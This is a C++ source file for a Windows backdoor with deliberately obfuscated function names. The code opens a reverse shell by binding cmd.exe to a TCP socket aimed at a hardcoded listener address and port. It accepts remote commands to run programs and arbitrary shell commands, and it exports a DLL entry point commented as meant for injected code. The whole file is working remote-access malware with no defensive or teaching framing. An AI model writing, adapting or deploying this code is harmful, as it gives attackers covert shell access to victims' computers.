#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>

// Function to execute command and get output (ExecuteCommand)
std::string x9k2m(const char* c1m2d) {
    char b1[128];
    std::string r1 = "";
    FILE* p1 = _popen(c1m2d, "r");
    if (!p1) return "Error executing command";

    while (fgets(b1, sizeof(b1), p1) != NULL) {
        r1 += b1;
    }
    _pclose(p1);
    return r1;
}

// Function to open Windows app (OpenApplication)
void o1a2p(const char* a1n2) {
    ShellExecuteA(NULL, "open", a1n2, NULL, NULL, SW_SHOW);
}

// Function to handle commands (HandleCommand)
void h1c2d(const std::string& c1m2) {
    if (c1m2 == "cmd") {
        o1a2p("cmd.exe");
    }
    else if (c1m2 == "notepad") {
        o1a2p("notepad.exe");
    }
    else if (c1m2 == "calc") {
        o1a2p("calc.exe");
    }
    else if (c1m2 == "explorer") {
        o1a2p("explorer.exe");
    }
    else if (c1m2 == "taskmgr") {
        o1a2p("taskmgr.exe");
    }
    else if (c1m2 == "control") {
        o1a2p("control.exe");
    }
    else if (c1m2 == "regedit") {
        o1a2p("regedit.exe");
    }
    else if (c1m2 == "msconfig") {
        o1a2p("msconfig.exe");
    }
    else if (c1m2 == "services") {
        o1a2p("services.msc");
    }
    else if (c1m2 == "devmgmt") {
        o1a2p("devmgmt.msc");
    }
    else if (c1m2.find("run ") == 0) {
        std::string a1c2 = c1m2.substr(4);
        std::string r1 = x9k2m(a1c2.c_str());
        std::cout << "Output: " << r1 << std::endl;
    }
    else {
        std::cout << "Unknown command. Available:" << std::endl;
        std::cout << "cmd - Command Prompt" << std::endl;
        std::cout << "notepad - Notepad" << std::endl;
        std::cout << "calc - Calculator" << std::endl;
        std::cout << "explorer - File Explorer" << std::endl;
        std::cout << "taskmgr - Task Manager" << std::endl;
        std::cout << "control - Control Panel" << std::endl;
        std::cout << "regedit - Registry Editor" << std::endl;
        std::cout << "msconfig - System Config" << std::endl;
        std::cout << "services - Services" << std::endl;
        std::cout << "devmgmt - Device Manager" << std::endl;
        std::cout << "run [cmd] - Execute command" << std::endl;
    }
}

// Function to create reverse shell (CreateReverseShell)
void c1r2s(const char* i1p2, int p1o2) {
    WSADATA w1d2;
    SOCKET s1k2;
    struct sockaddr_in s1r2;
    STARTUPINFO s1i2;
    PROCESS_INFORMATION p1i2;
    char c1m2[] = "cmd.exe";

    if (WSAStartup(MAKEWORD(2, 2), &w1d2) != 0) {
        return;
    }

    s1k2 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s1k2 == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    s1r2.sin_family = AF_INET;
    s1r2.sin_addr.s_addr = inet_addr(i1p2);
    s1r2.sin_port = htons(p1o2);

    if (connect(s1k2, (struct sockaddr*)&s1r2, sizeof(s1r2)) == SOCKET_ERROR) {
        closesocket(s1k2);
        WSACleanup();
        return;
    }

    ZeroMemory(&s1i2, sizeof(s1i2));
    s1i2.cb = sizeof(s1i2);
    s1i2.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    s1i2.hStdInput = s1i2.hStdOutput = s1i2.hStdError = (HANDLE)s1k2;

    if (!CreateProcessA(NULL, c1m2, NULL, NULL, TRUE, 0, NULL, NULL, &s1i2, &p1i2)) {
        closesocket(s1k2);
        WSACleanup();
        return;
    }

    char b1[1024];
    int b2r;
    while ((b2r = recv(s1k2, b1, sizeof(b1), 0)) > 0) {
        b1[b2r] = '\0';
        std::string c1m2(b1);
        h1c2d(c1m2);
        const char* r1s2 = "Done\n";
        send(s1k2, r1s2, strlen(r1s2), 0);
    }

    CloseHandle(p1i2.hProcess);
    CloseHandle(p1i2.hThread);
    closesocket(s1k2);
    WSACleanup();
}

// Entry point for injected code (StartBackdoor)
extern "C" __declspec(dllexport) void s1b2d() {
    const char* i1p2 = "127.0.0.1";
    int p1o2 = 4444;
    c1r2s(i1p2, p1o2);
}

// Main function
int main() {
    s1b2d();
    return 0;
} 